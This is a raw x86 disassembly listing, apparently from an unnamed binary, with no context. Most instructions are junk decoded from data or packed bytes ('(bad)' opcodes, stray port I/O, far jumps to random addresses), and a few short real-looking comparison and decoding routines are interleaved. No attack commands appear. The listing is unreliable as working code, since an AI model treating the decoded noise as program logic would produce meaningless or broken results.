  407a81:	xchg   ecx,eax
  407a82:	js     0x407a09
  407a84:	jle    0x407a91
  407a86:	(bad)  
  407a87:	jo     0x407adb
  407a89:	inc    ebx
  407a8a:	lods   al,BYTE PTR fs:[esi]
  407a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a8d:	xor    ah,BYTE PTR [ebx-0x37b51383]
  407a93:	cli    
  407a94:	inc    ebx
  407a95:	push   ds
  407a96:	add    BYTE PTR [ebp-0x4d27bfb9],ch
  407a9c:	arpl   WORD PTR [eax-0x7c],si
  407a9f:	shl    DWORD PTR [esi+0x76],cl
  407aa2:	add    esi,DWORD PTR [eax]
  407aa4:	(bad)
  407aa9:	inc    ebp
  407aaa:	sub    BYTE PTR [eax],cl
  407aac:	call   0x4ba2b88b
  407ab1:	add    dh,BYTE PTR [edi+0x61f31ad9]
  407ab7:	xchg   ebx,eax
  407ab8:	add    al,0x47
  407aba:	cwde   
  407abb:	and    eax,0xbf28dc7b
  407ac0:	not    DWORD PTR [ebx+edx*2-0x45012dce]
  407ac7:	lods   al,BYTE PTR ds:[esi]
  407ac8:	jmp    0x994f:0xcae0eab0
  407acf:	fcmovnbe st,st(6)
  407ad1:	pusha  
  407ad2:	and    dl,BYTE PTR [edx+ebx*8]
  407ad5:	pushf  
  407ad6:	ins    DWORD PTR es:[edi],dx
  407ad7:	imul   DWORD PTR [ebp-0x5a]
  407ada:	jbe    0x407a93
  407adc:	adc    al,BYTE PTR [esi-0x61b0b3c7]
  407ae2:	jb     0x407ac4
  407ae4:	or     dl,BYTE PTR [edi+ebx*4+0x50]
  407ae8:	push   ecx
  407ae9:	xchg   ebp,eax
  407aea:	pushf  
  407aeb:	les    edi,FWORD PTR [eax+eax*4-0x13]
  407aef:	pop    ds
  407af0:	stos   BYTE PTR es:[edi],al
  407af1:	or     ebx,DWORD PTR [edx]
  407af3:	aam    0x3d
  407af5:	pop    ecx
  407af6:	xchg   ecx,eax
  407af7:	aas    
  407af8:	int3   
  407af9:	shr    DWORD PTR [edi-0x50b301d6],cl
  407aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b00:	xchg   edx,eax
  407b01:	lds    ebp,FWORD PTR [ecx+esi*4]
  407b04:	mov    edx,0x85c0bb8
  407b09:	lock es (bad) 
  407b0d:	fild   DWORD PTR [ebx+0x65]
  407b10:	cmp    DWORD PTR [edi+edx*8-0x632e3c49],0xf08458b
  407b1b:	mov    bh,0x4
  407b1d:	nop
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	mov    eax,ds:0x7d408c54
  407b50:	lds    edi,FWORD PTR [esi+0x7e]
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407b90
  407b58:	jb     0x407b52
  407b5a:	jbe    0x407b43
  407b5c:	mov    ecx,0x601998bf
  407b61:	sti    
  407b62:	cmp    al,0xe5
  407b64:	imul   edx,ebp,0x24e7f456
  407b6a:	ret    
  407b6b:	popf   
  407b6c:	and    edx,DWORD PTR [edi-0x1493d2d8]
  407b72:	mov    bh,0xf1
  407b74:	shl    BYTE PTR [ebp+0x50],cl
  407b77:	dec    esp
  407b78:	test   DWORD PTR [edi],esi
  407b7a:	ins    DWORD PTR es:[edi],dx
  407b7b:	fidiv  DWORD PTR [edx]
  407b7d:	inc    ecx
  407b7e:	fisub  WORD PTR [eax-0x40c609bf]
  407b84:	xchg   ebx,eax
  407b85:	es push esi
  407b87:	mov    bh,0xd1
  407b89:	rcr    DWORD PTR [edi+0x5b],0x93
  407b8d:	(bad)  
  407b8e:	or     BYTE PTR [edi+0x2d250df1],cl
  407b94:	add    edx,DWORD PTR [ecx+0x2b5bacbf]
  407b9a:	neg    BYTE PTR [ebx+0x2ed386a9]
  407ba0:	xor    DWORD PTR [ecx],ecx
  407ba2:	fiadd  DWORD PTR [edx+0x64fbf851]
  407ba8:	popf   
  407ba9:	inc    ebx
  407baa:	std    
  407bab:	mov    ebp,0x8b32317b
  407bb0:	dec    eax
  407bb1:	sbb    edi,DWORD PTR [ecx]
  407bb3:	out    0x93,eax
  407bb5:	mov    eax,0x32ce9660
  407bba:	in     eax,0xf4
  407bbc:	jmp    0x407bb5
  407bbe:	push   ebp
  407bbf:	or     ebp,DWORD PTR [ebx]
  407bc1:	test   BYTE PTR [ebx-0x7dc54b45],al
  407bc7:	jnp    0x407c0b
  407bc9:	leave  
  407bca:	dec    eax
  407bcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bcc:	inc    esi
  407bcd:	mov    dl,0x24
  407bcf:	loope  0x407b70
  407bd1:	jnp    0x407c26
  407bd3:	mov    eax,0xbc46f182
  407bd8:	scas   eax,DWORD PTR es:[edi]
  407bd9:	cmc    
  407bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bdb:	jnp    0x407c31
  407bdd:	jg     0x407c52
  407bdf:	call   0xc5dc9486
  407be4:	shr    ebx,1
  407be6:	jae    0x407bce
  407be8:	out    0x58,eax
  407bea:	xchg   ecx,eax
  407beb:	cs (bad) 
  407bed:	fdiv   DWORD PTR [esi+0x184b43d8]
  407bf3:	dec    edx
  407bf4:	sub    eax,DWORD PTR [eax]
  407bf6:	cmp    WORD PTR [esi-0x79],di
  407bfa:	xor    ch,bh
  407bfc:	jnp    0x407b80
  407bfe:	cmc    
  407bff:	in     al,dx
  407c00:	ror    BYTE PTR [esi],1
  407c02:	out    0x4b,al
  407c04:	cli    
  407c05:	xor    BYTE PTR [edx],dh
  407c07:	lock das 
  407c09:	mov    edi,esp
  407c0b:	fld    QWORD PTR [esi]
  407c0d:	int    0x8
  407c0f:	rcr    BYTE PTR [ebx],0xd8
  407c12:	fisttp DWORD PTR [esp+0x56038ac5]
  407c19:	lds    ebp,FWORD PTR [eax+0x65]
  407c1c:	popf   
  407c1d:	mov    eax,ds:0xd1da8e01
  407c22:	sub    BYTE PTR [esi+0x38],0xf1
  407c26:	inc    edx
  407c27:	sub    dl,BYTE PTR [edx-0x55]
  407c2a:	and    eax,0x5e24d5cd
  407c2f:	inc    eax
  407c30:	jns    0x407be2
  407c32:	and    eax,0x9f4060ac
  407c37:	add    BYTE PTR ds:0x58a73ceb,al
  407c3d:	fidiv  WORD PTR ds:0xc246516f
  407c43:	inc    ecx
  407c44:	das    
  407c45:	push   esi
  407c46:	ins    DWORD PTR es:[edi],dx
  407c47:	xor    DWORD PTR [ebx+0x49faf82e],ebp
  407c4d:	popa   
  407c4e:	in     eax,0xf6
  407c50:	mov    al,0x61
  407c52:	sub    eax,0x1494ae75
  407c57:	jecxz  0x407be0
  407c59:	imul   eax,DWORD PTR [edx-0x57],0x1
  407c5d:	stc    
  407c5e:	mov    esp,0x39476652
  407c63:	sub    dh,BYTE PTR [esi+0x7d]
  407c66:	dec    edi
  407c67:	push   esi
  407c68:	push   0xe08e110b
  407c6d:	adc    eax,0x83d77593
  407c72:	adc    DWORD PTR [esp+ebp*2],esp
  407c75:	mov    ds:0xa1f408c9,eax
  407c7a:	ror    BYTE PTR [ebx-0x326f15fc],1
  407c80:	fmulp  st(2),st
  407c82:	repnz mov DWORD PTR [ebp-0x50588a1c],esi
  407c89:	inc    edi
  407c8a:	push   0x43
  407c8c:	rol    edi,cl
  407c8e:	pop    ebp
  407c8f:	cmc    
  407c90:	mov    ch,0x2
  407c92:	add    ebp,ebp
  407c94:	das    
  407c95:	push   0x9635821f
  407c9a:	rcr    BYTE PTR [ebp-0x71fdb3b9],cl
  407ca0:	push   es
  407ca1:	adc    esi,esp
  407ca3:	hlt    
  407ca4:	bswap  eax
  407ca6:	mov    dl,0xfb
  407ca8:	or     esp,DWORD PTR [ebp+0x64]
  407cab:	mov    ecx,?
  407cad:	cmp    DWORD PTR ds:0x58d5c50c,0xffffff8d
  407cb4:	neg    BYTE PTR [ebp+0x52]
  407cb7:	data16 or bl,BYTE PTR [ecx+ecx*4-0x75]
  407cbc:	inc    ebp
  407cbd:	clc    
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	call   FWORD PTR [ebx-0x382e307f]
  407ce5:	jle    0x407d65
  407ce7:	sar    BYTE PTR [edi+0x7e],cl
  407cea:	jle    0x407cde
  407cec:	sub    edx,ebx
  407cee:	outs   dx,BYTE PTR ds:[esi]
  407cef:	xchg   ecx,eax
  407cf0:	jmp    0x8c1d892
  407cf5:	ret    0x963d
  407cf8:	ds and al,0x49
  407cfb:	inc    eax
  407cfc:	mov    edi,0x8a768164
  407d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d02:	xchg   edi,eax
  407d03:	sahf   
  407d04:	sbb    ebp,DWORD PTR [edi-0x79]
  407d07:	and    eax,0xbd82eb6d
  407d0c:	fcom   QWORD PTR ds:0x22ddc80a
  407d12:	cmp    DWORD PTR [eax+0x4b],edx
  407d15:	shr    BYTE PTR [esi],cl
  407d17:	mov    esi,0x4db81a78
  407d1c:	push   0x22
  407d1e:	add    BYTE PTR [ebp+0x71f2b581],dl
  407d24:	adc    eax,0xb8c7a0
  407d29:	(bad)  
  407d2a:	mov    bl,0x67
  407d2c:	stos   BYTE PTR es:[edi],al
  407d2d:	cmp    al,0x7
  407d2f:	mov    ecx,0x2a95173f
  407d34:	push   ebx
  407d35:	adc    DWORD PTR [ecx-0x43],esi
  407d38:	pop    edx
  407d39:	mov    ah,0x2a
  407d3b:	test   DWORD PTR ds:0x2ba058d4,esi
  407d41:	rol    DWORD PTR [esi],0xe4
  407d44:	cmp    ecx,DWORD PTR [edi*8+0xafacbcb]
  407d4b:	sbb    bh,BYTE PTR [eax+0x7c4c55c]
  407d51:	outs   dx,BYTE PTR ds:[esi]
  407d52:	adc    ah,BYTE PTR [ecx+0x219972c8]
  407d58:	xchg   edx,eax
  407d59:	or     DWORD PTR [edx-0x56887fb8],ebp
  407d5f:	fld    DWORD PTR [edi-0x3e]
  407d62:	xor    esi,0xbb8a3160
  407d68:	fisttp QWORD PTR [edx+0x52]
  407d6b:	fs in  eax,0xd5
  407d6e:	test   BYTE PTR [ebp+eiz*1+0x38ba4fe8],dl
  407d75:	cmp    bh,BYTE PTR [ecx-0x50]
  407d78:	fucomi st,st(4)
  407d7a:	jb     0x407d1e
  407d7c:	lods   al,BYTE PTR ds:[esi]
  407d7d:	mov    ebp,DWORD PTR [edx]
  407d7f:	cwde   
  407d80:	dec    esp
  407d81:	dec    ecx
  407d82:	jmp    0x407e01
  407d84:	out    dx,al
  407d85:	and    BYTE PTR [edi-0x65],dh
  407d88:	adc    edi,ebp
  407d8a:	sbb    cl,bl
  407d8c:	and    edi,DWORD PTR [eax]
  407d8e:	cs dec eax
  407d90:	or     esi,DWORD PTR [esi-0x7e]
  407d93:	and    BYTE PTR [ebx],ah
  407d95:	push   es
  407d96:	je     0x407d9c
  407d98:	loopne 0x407d7a
  407d9a:	rcr    DWORD PTR [ebx+0x72573f20],0x64
  407da1:	add    bh,BYTE PTR [ecx-0x1a2cd08f]
  407da7:	or     eax,DWORD PTR [edx-0x30]
  407daa:	inc    edi
  407dab:	or     al,0xc8
  407dad:	push   ebp
  407dae:	cwde   
  407daf:	mov    ebp,0xfc80193e
  407db4:	push   edx
  407db5:	call   0x83bfb373
  407dba:	clc    
  407dbb:	inc    ecx
  407dbc:	push   esp
  407dbd:	jmp    0xf1d78a56
  407dc2:	out    0x98,eax
  407dc4:	pop    eax
  407dc5:	div    ebx
  407dc7:	test   al,0x17
  407dc9:	push   ds
  407dca:	and    esi,DWORD PTR [esi+ecx*4]
  407dcd:	add    BYTE PTR [ebx+0x25],dl
  407dd0:	pop    ebx
  407dd1:	lahf   
  407dd2:	add    eax,0xa8b577f5
  407dd7:	mov    ah,0x2e
  407dd9:	jae    0x407da0
  407ddb:	jge    0x407d68
  407ddd:	fcmove st,st(1)
  407ddf:	mov    dl,0x69
  407de1:	stc    
  407de2:	adc    al,0x13
  407de4:	sbb    ebx,DWORD PTR [ecx-0x6ef8011c]
  407dea:	(bad)  
  407deb:	jmp    0x407e36
  407ded:	dec    eax
  407dee:	es clc 
  407df0:	pop    ss
  407df1:	push   esi
  407df2:	lahf   
  407df3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407df4:	push   esp
  407df5:	loop   0x407e0a
  407df7:	mov    edi,0xf06e73a1
  407dfc:	fwait
  407dfd:	jl     0x407e6d
  407dff:	aas    
  407e00:	or     al,BYTE PTR [esi-0x28]
  407e03:	xchg   ecx,eax
  407e04:	mov    ecx,0x65747e67
  407e09:	popf   
  407e0a:	pop    esp
  407e0b:	jl     0x407de7
  407e0d:	jl     0x407e8d
  407e0f:	dec    ebp
  407e10:	fsubr  QWORD PTR [ecx-0x2163df08]
  407e16:	sbb    cl,BYTE PTR [esi-0x25]
  407e19:	pop    ss
  407e1a:	icebp  
  407e1b:	dec    eax
  407e1c:	mov    ecx,DWORD PTR [eax]
  407e1e:	shl    BYTE PTR [ebx],0xed
  407e21:	rcl    DWORD PTR [edi+0x57],0x77
  407e25:	scas   al,BYTE PTR es:[edi]
  407e26:	sbb    DWORD PTR cs:[edx+0x18],ebp
  407e2a:	mov    edx,0xb07caffb
  407e2f:	add    dh,dh
  407e31:	sub    DWORD PTR [ebp+eiz*8+0x2b],ebx
  407e35:	cmc    
  407e36:	mov    ds:0x5e5fa1a7,eax
  407e3b:	popf   
  407e3c:	imul   edi,DWORD PTR [eax-0x4d19cc1],0xd0a42047
  407e46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e47:	push   ds
  407e48:	and    ecx,DWORD PTR [esp+edi*8-0x51bb5e75]
  407e4f:	mov    DWORD PTR [ebp+0x8],eax
  407e52:	mov    eax,DWORD PTR [ebp+0x8]
  407e55:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e59:	mov    dl,BYTE PTR [ebp-0x1]
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0x63
  407ea7:	jo     0x407eef
  407ea9:	mov    dh,0xb5
  407eab:	fdivr  DWORD PTR [esi+0x7e]
  407eae:	sar    BYTE PTR [edi+0x7e],cl
  407eb1:	jle    0x407f19
  407eb3:	fwait
  407eb4:	data16 mov dh,0x95
  407eb7:	inc    DWORD PTR [esi]
  407eb9:	jo     0x407f0c
  407ebb:	or     edx,DWORD PTR cs:[edi]
  407ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ebf:	jge    0x407f3d
  407ec1:	nop
  407ec2:	inc    edx
  407ec3:	adc    eax,0x83301c17
  407ec8:	jns    0x407ea2
  407eca:	ins    BYTE PTR es:[edi],dx
  407ecb:	mov    ah,0x2a
  407ecd:	mov    dl,0xeb
  407ecf:	sbb    al,0x74
  407ed1:	outs   dx,BYTE PTR ds:[esi]
  407ed2:	enter  0xa20,0xaa
  407ed6:	imul   BYTE PTR [edi+0x64]
  407ed9:	sub    DWORD PTR ds:0x77272240,0xf2f1dc7c
  407ee3:	loope  0x407f1f
  407ee5:	aad    0xe5
  407ee7:	sar    BYTE PTR [edx-0x34caabf7],cl
  407eed:	mov    esp,0x4bb65c65
  407ef2:	shr    BYTE PTR [esp+esi*8],0xea
  407ef6:	mov    bh,0x2d
  407ef8:	dec    esi
  407ef9:	adc    edx,DWORD PTR [eax]
  407efb:	mov    edx,0xfc48e4e9
  407f00:	lock nop
  407f02:	dec    ecx
  407f03:	in     al,dx
  407f04:	fild   QWORD PTR [esi]
  407f06:	xor    al,0xe7
  407f08:	data16 hlt 
  407f0a:	sbb    ecx,DWORD PTR [ebx-0x6f2b0389]
  407f10:	xchg   bh,dh
  407f12:	fucomi st,st(2)
  407f14:	ror    DWORD PTR [eax],cl
  407f16:	out    0x80,al
  407f18:	int    0x10
  407f1a:	clc    
  407f1b:	sbb    al,0x40
  407f1d:	inc    edx
  407f1e:	pop    ds
  407f1f:	cmp    BYTE PTR [edx+ebx*1],al
  407f22:	daa    
  407f23:	lods   eax,DWORD PTR ds:[esi]
  407f24:	shl    BYTE PTR [eax+0x74],0x88
  407f28:	call   0x2eb7b47a
  407f2d:	repnz add BYTE PTR [edx+0x6ee9d0ee],bh
  407f34:	mov    al,0x49
  407f36:	mov    edi,0x225d56bb
  407f3b:	jnp    0x407f4d
  407f3d:	imul   ebp,eax,0xffffffdc
  407f40:	je     0x407fa2
  407f42:	pop    eax
  407f43:	xor    dh,BYTE PTR [eax-0x69bb1dee]
  407f49:	or     cl,0x60
  407f4c:	or     ebp,DWORD PTR [ebx+0x399174d2]
  407f52:	fild   DWORD PTR [edi+0x7a]
  407f55:	mov    ebp,0xdc5548de
  407f5a:	jmp    0xe6bc1d58
  407f5f:	mov    ds:0x7909cb3a,eax
  407f64:	adc    eax,0x802b9b22
  407f69:	xchg   edi,eax
  407f6a:	dec    ecx
  407f6b:	push   eax
  407f6c:	push   es
  407f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f6e:	fbld   TBYTE PTR [ebx]
  407f70:	lods   al,BYTE PTR ds:[esi]
  407f71:	sbb    eax,0xd3fe26e2
  407f76:	pop    ebx
  407f77:	dec    esi
  407f78:	inc    esi
  407f79:	cwde   
  407f7a:	xor    DWORD PTR [ebp+0x4f919c9e],esp
  407f80:	push   cs
  407f81:	pushw  es
  407f83:	std    
  407f84:	mov    edx,0xa152e396
  407f89:	jmp    0x6107936e
  407f8e:	int3   
  407f8f:	imul   edi,esi,0x5e
  407f92:	rcl    esi,cl
  407f94:	cwde   
  407f95:	int    0xd8
  407f97:	mov    cl,0x2e
  407f99:	popa   
  407f9a:	out    dx,eax
  407f9b:	retf   0x9b30
  407f9e:	fcomp  QWORD PTR [ebx]
  407fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fa1:	sbb    ecx,ecx
  407fa3:	mov    fs,WORD PTR [ebx+eax*8+0x1c]
  407fa7:	aaa    
  407fa8:	ins    DWORD PTR es:[edi],dx
  407fa9:	pop    esp
  407faa:	fs inc bl
  407fad:	or     DWORD PTR [ecx+0x56],0x3ffc574e
  407fb4:	lahf   
  407fb5:	xchg   esi,eax
  407fb6:	push   esi
  407fb7:	mov    esi,0x998feb81
  407fbc:	outs   dx,DWORD PTR ds:[esi]
  407fbd:	sub    eax,0xee88134f
  407fc2:	out    0x95,eax
  407fc4:	push   0xffffffc9
  407fc6:	inc    DWORD PTR [edi]
  407fc8:	dec    ecx
  407fc9:	std    
  407fca:	sbb    BYTE PTR [ecx*2-0x3f07eca9],0x1f
  407fd2:	add    eax,0xe25feeef
  407fd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fd8:	push   edx
  407fd9:	cmp    ebx,DWORD PTR [eax+0x3c]
  407fdc:	mov    ds:0x5a921c26,al
  407fe1:	mov    eax,0x3dd7e880
  407fe6:	push   es
  407fe7:	jmp    0x9b2c:0x8a7d6a56
  407fee:	call   0xec622fba
  407ff3:	test   eax,0xac8ad73f
  407ff8:	cmp    al,0xc5
  407ffa:	cmp    al,0x4
  407ffc:	sub    BYTE PTR [edx+0xc],dl
  407fff:	sti    
  408000:	leave  
  408001:	in     eax,0xe4
  408003:	mov    edi,0x7dabda70
  408008:	add    al,0xfe
  40800a:	out    dx,al
  40800b:	add    dh,BYTE PTR [edx-0x1c96f785]
  408011:	idiv   BYTE PTR [edx-0x766be945]
  408017:	inc    ebp
  408018:	in     al,dx
  408019:	mov    eax,DWORD PTR [ebp-0x14]
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx+0x19339ce6],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x407fdd
  408040:	xor    al,0x76
  408042:	into   
  408043:	in     eax,dx
  408044:	dec    esi
  408045:	ret    
  408046:	and    al,0xed
  408048:	in     eax,dx
  408049:	hlt    
  40804a:	jb     0x408037
  40804c:	(bad)  
  40804d:	fisttp DWORD PTR ds:[ebp-0x28]
  408051:	push   eax
  408052:	pop    es
  408053:	adc    bh,BYTE PTR [ecx]
  408055:	jmp    0x5796ef2b
  40805a:	popa   
  40805b:	pop    esp
  40805c:	in     al,0xb3
  40805e:	popf   
  40805f:	mov    edi,0x64de49d8
  408064:	adc    dl,al
  408066:	dec    ecx
  408067:	xchg   ebx,eax
  408068:	xor    eax,0x3eeb192d
  40806d:	mov    eax,ds:0x9dbcd0bb
  408072:	imul   esp,DWORD PTR [edi-0x794053f9],0xaa5b6b41
  40807c:	sbb    bh,BYTE PTR [ebx]
  40807e:	add    BYTE PTR [ecx+edx*8+0x1e0b1200],ch
  408085:	retf   
  408086:	mov    esi,0xd39ecb4e
  40808b:	xor    BYTE PTR [ecx+ebx*1],bh
  40808e:	mov    ds:0xb37bdb9a,eax
  408093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408094:	xchg   ebx,eax
  408095:	xor    bl,al
  408097:	push   esi
  408098:	mov    ebx,0x85ac93b8
  40809d:	xchg   ebp,eax
  40809e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080a0:	jmp    0x2459:0xe736358b
  4080a7:	jp     0x4080a4
  4080a9:	sub    DWORD PTR [ebx],edx
  4080ab:	sbb    eax,0x1f3f73b5
  4080b1:	adc    DWORD PTR [edi-0x32],ebx
  4080b4:	call   0x6f5287ae
  4080b9:	leave  
  4080ba:	repz sbb al,0xc6
  4080bd:	popf   
  4080be:	test   eax,0x8a791129
  4080c3:	sub    BYTE PTR [esi],cl
  4080c5:	fdivr  DWORD PTR [ecx]
  4080c7:	push   0xc6d972cf
  4080cc:	xchg   ecx,eax
  4080cd:	jmp    0x451c399
  4080d2:	sbb    eax,0xb223dac3
  4080d7:	xchg   esp,eax
  4080d8:	(bad)
  4080db:	rol    BYTE PTR [esi+edx*1-0x1],0xe5
  4080e0:	sub    eax,DWORD PTR [eax-0x443aa5c9]
  4080e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080e7:	mov    WORD PTR [eax],?
  4080e9:	mov    WORD PTR [esi-0x6a9d2683],fs
  4080ef:	xchg   ecx,eax
  4080f0:	dec    esp
  4080f1:	sub    esi,ebp
  4080f3:	inc    ebx
  4080f4:	or     DWORD PTR [esi+0x15],0x67591ba5
  4080fb:	loop   0x408137
  4080fd:	cwde   
  4080fe:	enter  0xa4fa,0x7e
  408102:	aam    0x6f
  408104:	or     ah,dl
  408106:	cmp    eax,0x14c601e3
  40810b:	add    DWORD PTR ds:0x268d41cb,eax
  408111:	call   0x40c0bb4a
  408116:	mov    cl,0xe0
  408118:	add    eax,DWORD PTR [eax-0x1a]
  40811b:	mov    ch,0x4c
  40811d:	div    DWORD PTR [edx+0x5f2042db]
  408123:	call   0x706b:0x3d406730
  40812a:	stos   BYTE PTR es:[edi],al
  40812b:	shl    DWORD PTR [edi],cl
  40812d:	popf   
  40812e:	push   cs
  40812f:	icebp  
  408130:	jmp    0xe01a:0xd74d1822
  408137:	mov    esi,0x96dfcdb9
  40813c:	fwait
  40813d:	cmp    ah,BYTE PTR [ebx+0x0]
  408140:	loope  0x4080ff
  408142:	into   
  408143:	push   ebx
  408144:	das    
  408145:	mov    eax,0x24d9cdbc
  40814a:	aaa    
  40814b:	loope  0x4081b4
  40814d:	cmp    eax,0xf2de87af
  408152:	jmp    0x408140
  408154:	test   BYTE PTR ds:0xc90c6b9e,bl
  40815a:	in     eax,dx
  40815b:	mov    al,0x56
  40815d:	xor    eax,0x760ca375
  408162:	add    dh,BYTE PTR [eax+eax*2]
  408165:	addr16 inc edi
  408167:	int    0x1a
  408169:	jno    0x4081ad
  40816b:	into   
  40816c:	push   es
  40816d:	xchg   ebx,eax
  40816e:	push   edx
  40816f:	mov    ch,0x20
  408171:	stc    
  408172:	rcr    dh,cl
  408174:	mov    esi,0xccb7b055
  408179:	ins    BYTE PTR es:[edi],dx
  40817a:	xor    BYTE PTR [esi-0x46],bl
  40817d:	ror    esp,cl
  40817f:	out    dx,al
  408180:	mov    ch,0x5c
  408182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408183:	hlt    
  408184:	xchg   edi,eax
  408185:	cld    
  408186:	xchg   ebp,eax
  408187:	pop    ebp
  408188:	cmp    al,0x5f
  40818a:	repnz sbb ch,BYTE PTR [edx]
  40818d:	retf   
  40818e:	lahf   
  40818f:	mov    ecx,0x1adf7315
  408194:	sti    
  408195:	retf   
  408196:	jp     0x408141
  408198:	xor    ebx,DWORD PTR [ebx]
  40819a:	(bad)  
  40819c:	jbe    0x4081f2
  40819e:	jae    0x40819a
  4081a0:	fimul  WORD PTR [ecx]
  4081a2:	fisttp WORD PTR [ebx+0x558bf045]
  4081a8:	or     BYTE PTR [ebx],dh
  4081aa:	shr    ecx,0x7c
  4081ad:	add    DWORD PTR [eax],eax
  4081af:	add    BYTE PTR [edx-0x80],cl
  4081b2:	fld    QWORD PTR [edi]
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp-0xba25671]
  4081bf:	push   0x7e7edb8d
  4081c4:	sar    BYTE PTR [edi+0x7e],cl
  4081c7:	jle    0x4081ff
  4081c9:	data16 mov ds:0xd4caa26c,al
  4081cf:	pushf  
  4081d0:	sahf   
  4081d1:	scas   eax,DWORD PTR es:[edi]
  4081d2:	push   es
  4081d3:	sbb    BYTE PTR [ebx],0x51
  4081d6:	stos   BYTE PTR es:[edi],al
  4081d7:	inc    edi
  4081d8:	adc    BYTE PTR [ebp+esi*4+0x28],ah
  4081dc:	call   0x5003fca9
  4081e1:	jb     0x408176
  4081e3:	div    DWORD PTR ds:0x16977cc
  4081e9:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4081eb:	xchg   esp,eax
  4081ec:	sbb    ebx,DWORD PTR [esi]
  4081ee:	inc    ebp
  4081ef:	dec    esp
  4081f0:	push   eax
  4081f1:	test   DWORD PTR [eax+0x3f],edi
  4081f4:	bound  edi,QWORD PTR [ebx+0xa]
  4081f7:	shl    DWORD PTR [edi+0x79],1
  4081fa:	in     al,0x8f
  4081fc:	mov    al,ds:0xaba8d14
  408201:	sub    al,0x82
  408203:	neg    DWORD PTR [ecx-0x17ee8007]
  408209:	fistp  DWORD PTR [ecx+0x65787330]
  40820f:	test   DWORD PTR [esi-0x18],edi
  408212:	retf   
  408213:	jbe    0x4081ef
  408215:	mov    dl,0xeb
  408217:	dec    ebp
  408218:	scas   al,BYTE PTR es:[edi]
  408219:	adc    DWORD PTR [esi+0x318db6ed],edx
  40821f:	cld    
  408220:	xor    eax,0xd21a32bb
  408225:	mov    edi,0xe0bcb824
  40822a:	sub    eax,0xe0d453bc
  40822f:	hlt    
  408230:	rcl    BYTE PTR [esi+0x59db6500],0x1c
  408237:	out    dx,al
  408238:	stos   BYTE PTR es:[edi],al
  408239:	sahf   
  40823a:	dec    ecx
  40823b:	mov    BYTE PTR [ebp+0x1d],cl
  40823e:	xchg   esi,eax
  40823f:	adc    eax,eax
  408241:	jmp    0x408270
  408243:	push   ebx
  408244:	inc    ebp
  408245:	loop   0x4081cb
  408247:	ja     0x4081e9
  408249:	dec    esi
  40824a:	fs std 
  40824c:	mov    edx,0xe81176be
  408251:	adc    esi,DWORD PTR [ecx-0x54]
  408254:	push   ss
  408255:	mov    ebp,esi
  408257:	pop    ecx
  408258:	dec    ebx
  408259:	outs   dx,BYTE PTR ds:[esi]
  40825a:	pop    ebx
  40825b:	fwait
  40825c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40825d:	dec    eax
  40825e:	shr    eax,0x97
  408261:	test   al,0x47
